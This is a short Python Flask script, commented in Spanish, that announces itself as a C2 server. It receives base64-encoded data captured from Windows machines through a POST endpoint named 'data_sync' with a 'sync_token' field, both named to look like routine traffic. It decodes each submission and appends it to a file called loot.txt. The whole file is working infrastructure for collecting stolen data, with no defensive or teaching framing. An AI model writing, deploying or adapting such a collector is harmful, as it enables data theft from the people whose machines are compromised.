from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/data_sync', methods=['POST'])
def receive_data():
    # Obtenemos los mensajes crudos que llegan de Windows
    encoded_data = request.form.get('sync_token') or request.get_data(as_text=True).replace('sync_token','')

    if encoded_data:
        try:
            #2. Intentamos decodificar Base64
            decoded_data = base64.b64decode(encoded_data.strip() + "==").decode('utf-8',errors='ignore')
            # FORZAR LA CREACIÓN Y ESCRITURA DEL ARCHIVO
            with open("loot.txt", "a") as f:
                f.write(decoded_data + "\n")
                f.flush() # Esto obliga al sistema a guardar el archivo inmediatamente
            
            print(f"\n[+] NUEVA CAPTURA GUARDADA EN LOOT.TXT: {decoded_data}")
            return "OK", 200
        
        except Exception as e: 
            print("[-] Se recibio un POST pero estaba vacio o mal formado")
            return "No Data", 400

if __name__ == "__main__":
    print("[*] Servidor C2 Online - Esperando datos...")
    app.run(host='0.0.0.0', port=5000)